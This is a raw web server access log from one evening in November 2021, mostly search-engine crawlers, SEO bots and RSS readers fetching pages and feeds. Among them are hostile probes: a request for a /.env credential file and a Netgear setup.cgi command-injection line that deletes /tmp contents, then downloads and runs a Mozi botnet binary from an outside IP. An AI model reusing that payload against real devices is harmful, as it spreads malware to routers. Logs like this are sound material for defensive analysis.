216.244.66.232 - - [29/Nov/2021:18:53:44 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
190.94.138.44 - - [29/Nov/2021:18:59:25 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.191.171.2 - - [29/Nov/2021:19:00:20 +0000] "GET /blog/assets_c/2010/12/IMG_20101202_234544-24.html HTTP/1.1" 301 276 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
209.153.66.66 - - [29/Nov/2021:19:11:11 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Tiny Tiny RSS/21.11-831648e (https://tt-rss.org/)"
104.248.161.159 - - [29/Nov/2021:19:11:45 +0000] "GET /.env HTTP/1.1" 301 234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
104.248.161.159 - - [29/Nov/2021:19:11:45 +0000] "POST / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.241.207.28 - - [29/Nov/2021:19:36:34 +0000] "GET /actuator/health HTTP/1.1" 301 245 "-" "Mozilla/5.0 zgrab/0.x"
97.107.132.77 - - [29/Nov/2021:19:41:16 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
157.55.39.27 - - [29/Nov/2021:19:41:18 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
209.153.66.66 - - [29/Nov/2021:20:06:04 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Tiny Tiny RSS/21.11-831648e (https://tt-rss.org/)"
23.148.145.233 - - [29/Nov/2021:20:18:08 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0"
87.250.224.4 - - [29/Nov/2021:20:19:23 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
87.250.224.4 - - [29/Nov/2021:20:19:27 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
157.55.39.87 - - [29/Nov/2021:20:26:52 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.1 - - [29/Nov/2021:20:27:05 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
51.222.253.18 - - [29/Nov/2021:20:31:58 +0000] "GET /robots.txt HTTP/1.1" 301 238 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.149.61 - - [29/Nov/2021:20:31:59 +0000] "GET / HTTP/1.1" 301 228 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
115.206.214.222 - - [29/Nov/2021:20:38:02 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://125.121.151.150:34462/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 301 403 "-" "-"
172.104.217.53 - - [29/Nov/2021:20:41:19 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
45.146.164.132 - - [29/Nov/2021:20:58:02 +0000] "\x03" 400 226 "-" "-"
209.153.66.66 - - [29/Nov/2021:21:03:46 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Tiny Tiny RSS/21.11-831648e (https://tt-rss.org/)"
157.55.39.180 - - [29/Nov/2021:21:08:43 +0000] "GET /datasheets/breezecom/ HTTP/1.1" 301 248 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
